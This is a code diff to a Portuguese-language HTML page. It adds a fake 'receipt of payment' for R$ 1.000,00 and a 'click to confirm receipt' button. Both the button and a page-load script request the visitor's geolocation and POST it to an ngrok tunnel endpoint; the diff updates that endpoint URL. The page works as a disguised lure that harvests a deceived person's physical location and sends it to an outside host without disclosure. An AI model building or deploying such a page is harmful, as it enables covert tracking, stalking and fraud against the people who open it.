@@ -11,6 +11,24 @@
 <body style="background-color: antiquewhite;">
   <h1>Comprovante</h1>
 
+  <div class="comprovante-container">
+    <h1>Comprovante de Recebimento</h1>
+
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
+      <p><span>De:</span> João Silva de Oliveira</p>
+      <p><span>Status:</span> Recebido com Sucesso</p>
+    </div>
+
+    <button class="botao" onclick="navigator.geolocation.getCurrentPosition(sendLocation, handleError)">Clique aqui para confirmar o recebimento</button>
+
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+
+  </div>
   <script>
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
@@ -40,7 +58,7 @@
       // console.log("Longitude: " + longitude);
 
       // Envia a localização para o backend
-      fetch("https://48b8-2804-7f0-bb41-46f3-9853-615a-e14b-3c18.ngrok-free.app/receber-localizacao", {
+      fetch("https://1f4a-2804-7f0-bb41-46f3-ed00-231b-6a2b-9a9e.ngrok-free.app/receber-localizacao", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
